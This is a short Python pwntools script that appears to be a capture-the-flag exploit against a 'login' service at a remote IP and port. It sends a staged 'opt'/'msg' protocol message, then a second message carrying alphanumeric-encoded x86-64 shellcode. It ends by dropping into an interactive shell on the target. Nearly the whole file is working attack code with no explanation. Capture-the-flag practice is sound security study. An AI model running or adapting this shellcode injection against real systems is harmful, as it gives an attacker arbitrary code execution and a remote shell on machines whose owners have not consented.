from pwn import *

p = remote("47.93.156.176","14528")
# p = process('./login')
context(arch = 'amd64', os = 'linux', log_level = 'debug')


# attach(p,'b *$rebase(0x0000000000000EC9)')
payload1 = "opt:1\nmsg:ro0t1\n\n"

shellcode_64="Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00"
payload="opt:2\nmsg:"+shellcode_64+"\n\n"

p.recvuntil('>>> ')
p.send(payload1)
pause()
p.recvuntil(">>> ")
p.send(payload)

pause()
p.interactive()
